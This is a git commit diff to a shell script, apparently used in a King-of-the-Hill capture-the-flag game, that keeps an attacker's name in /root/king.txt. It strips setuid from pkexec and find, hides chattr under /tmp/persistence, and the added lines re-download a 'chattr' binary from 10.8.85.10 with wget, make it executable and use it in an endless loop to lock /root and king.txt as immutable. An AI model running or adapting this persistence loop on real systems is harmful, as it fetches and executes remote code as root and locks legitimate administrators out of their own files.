08135601946923e6467d9140227f1131863c4ec3
Faruk <98034193+farukerdem34@users.noreply.github.com>
2023-08-21 15:08:54 -0400

    Update script.sh

--- scripts/script.sh
+++ scripts/script.sh
@@ -2,6 +2,15 @@ chmod -s /usr/bin/pkexec
 chmod -s $(which find)
 mv $(which chattr) /tmp/persistence
 while true; do
+     if ls -l /tmp/persistence
+          then
+               echo OK
+          else
+          	wget 10.8.85.10/chattr
+          	mv chattr /tmp/persistence
+          	chmod +x /tmp/persistence
+          	echo DONE
+     fi
      /tmp/persistence -ia /root
      /tmp/persistence -ia /root/king.txt 2>/dev/null
      echo -n "lomarkomar" >| /root/king.txt 2>/dev/null
